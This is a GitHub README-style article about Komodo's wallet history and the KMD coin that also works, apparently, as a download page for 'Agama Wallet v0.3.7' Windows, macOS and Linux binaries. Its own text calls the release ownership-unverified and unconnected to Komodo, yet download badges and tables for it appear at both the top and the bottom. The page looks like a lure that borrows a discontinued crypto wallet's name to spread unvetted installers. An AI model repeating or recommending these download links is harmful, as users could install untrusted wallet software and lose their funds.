[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Komodo Wallet: What It Is and How KMD Works

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Komodo is a UTXO blockchain whose wallet line has changed three times: Agama, then AtomicDEX, then Komodo Wallet, with Gleec Exchange Wallet now serving as the ecosystem's current wallet. KMD is its native coin. Agama Wallet, the 0.3.7 release published from its own repository, is a separate product with no established link to Komodo or Gleec.

## You'll see this if

You search for "Komodo wallet", land on a page offering "Agama Wallet", and cannot tell whether you have found the ecosystem's current wallet, an old one, or something unrelated that borrowed the name.

| Product | Period | What it was | Where it stands |
|---|---|---|---|
| Agama | to 2019 | Komodo's desktop wallet | Discontinued 2019-06-07; repository labelled not for use |
| AtomicDEX | 2019 onward | Exchange named as Agama's replacement | Superseded |
| Komodo Wallet | later | The ecosystem's next wallet | Superseded |
| Gleec Exchange Wallet | current | Non-custodial multi-chain wallet with atomic swaps | Current |
| Agama Wallet 0.3.7 | 2026 | Release published on GitHub | Ownership unverified |

Four of those five are Komodo's. The last one is not, as far as any public record shows.

## Why it happens

Komodo's product history is genuinely discontinuous. The original desktop wallet was deprecated after 2019 and replaced; the ecosystem then moved through another wallet generation and into the Gleec ecosystem. Each transition kept the chain and the coin while changing the software.

Meanwhile the Agama name stayed in circulation. The original repository is still public, labelled "Discontinued software - DONT USE - only for educational purpose", with a version file reading 0.3.7 and a releases page that reports no releases. A separate project publishes a 0.3.7 release under the same name. Nothing in WHOIS, announcements, social accounts or commits connects that site to Komodo or Gleec, so the two Agamas cannot be treated as one product.

The chain and the coin are unaffected by any of this; the question is which software to run. KMD is a UTXO asset, Komodo's delayed proof of work notarises its blocks onto Bitcoin through notary nodes, and the ecosystem supports asset chains alongside the main chain. [Komodo dPoW](https://github.com/agama-wallet/agama-wallet/blob/main/delayed-proof-of-work.md) explains the notarisation, and [what KMD is](https://github.com/agama-wallet/agama-wallet/blob/main/what-kmd-does.md) covers the coin.

## Fix

The practical task is choosing the right wallet for the right job, which means dating the product before trusting it.

1. **Decide which question you are answering.** Holding KMD today is a different question from recovering KMD from a 2018 install.
2. **For holding KMD now, use the ecosystem's current wallet.** Komodo is part of the Gleec ecosystem and its current wallet is Gleec Exchange Wallet, a non-custodial multi-chain wallet with desktop, mobile and web builds.
3. **For recovering from an old install, treat it as a migration.** The phrase is the portable part; the software is not. [Moving KMD out of an old Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/move-kmd-out-safely.md) covers the export side.
4. **For the 0.3.7 release, treat ownership as unverified.** No public record ties its site to Komodo or Gleec, so nothing about it should be assumed from the Komodo name.
5. **For swap mechanics, read the protocol rather than the branding.** [AtomicDEX](https://github.com/agama-wallet/agama-wallet/blob/main/atomicdex-explained.md) explains how the exchange layer related to the wallet layer.

If a page tells you that Agama is "the Komodo wallet", check the date of that statement. It was true until June 2019.

## If that did not work

If the current Komodo wallet will not import an old backup, the obstacle is format rather than ownership: a wallet file from one generation is not a phrase, and not every successor reads every predecessor's file.

If a balance is missing after an import, confirm the derivation path and the address range before concluding the funds are gone. Never type a recovery phrase into a page that offers to check it for you; a restore happens inside wallet software, never in a browser form. [Why a seed phrase fails to restore](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md) sets out the causes in order.

If a site offering an "Agama" download also claims to be Komodo's official wallet, that combination is not supported by any source, and no install should follow from it.

## Prevention

- **Date the product, not just the name.** Every claim about a Komodo wallet is true of a period.
- **Verify the publisher before downloading.** A domain that resembles a brand is not evidence of ownership.
- **Keep the phrase, not the installer.** The recovery material outlives every wallet generation; the binary does not.
- **Do not assume a successor reads an old file.** Check the import path before moving value.
- **Separate "Komodo" from "Agama" in your own notes.** The confusion compounds otherwise.

## FAQ

### Is Agama still Komodo's wallet?

No. Komodo discontinued the original Agama on 2019-06-07 and named AtomicDEX as its replacement; the ecosystem's wallet has changed again since, and Gleec Exchange Wallet is current.

### Is the Agama Wallet 0.3.7 release made by Komodo?

No public record connects the site distributing it to Komodo or Gleec. It is an ownership-unverified build sharing a name with the discontinued wallet.

### What is KMD used for?

KMD is Komodo's native coin, used for fees and as the base asset of the chain, with asset chains and notarisation alongside it. It is a UTXO asset, so balances behave like Bitcoin balances.

### Was Agama ever Komodo's official wallet?

Yes, until June 2019. Agama was Komodo's desktop wallet, and Komodo announced on 2019-06-07 that it had discontinued it and named AtomicDEX as the replacement. Any page calling it the current wallet is describing a period that ended then.

### Can I still recover funds from an old Komodo Agama install?

Usually yes, if the recovery phrase or wallet file survives, because the phrase is portable even though the software is not. The procedure is a migration, not a repair.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [KMD Coin: What Komodo's Native Asset Does](https://github.com/agama-wallet/agama-wallet/blob/main/what-kmd-does.md)
- [Komodo dPoW: Notarising One Chain to Another](https://github.com/agama-wallet/agama-wallet/blob/main/delayed-proof-of-work.md)
- [AtomicDEX: What the Decentralised Exchange Was](https://github.com/agama-wallet/agama-wallet/blob/main/atomicdex-explained.md)
- [Is Agama Wallet Discontinued? Two Products, One Name](https://github.com/agama-wallet/agama-wallet/blob/main/two-products-one-name.md)
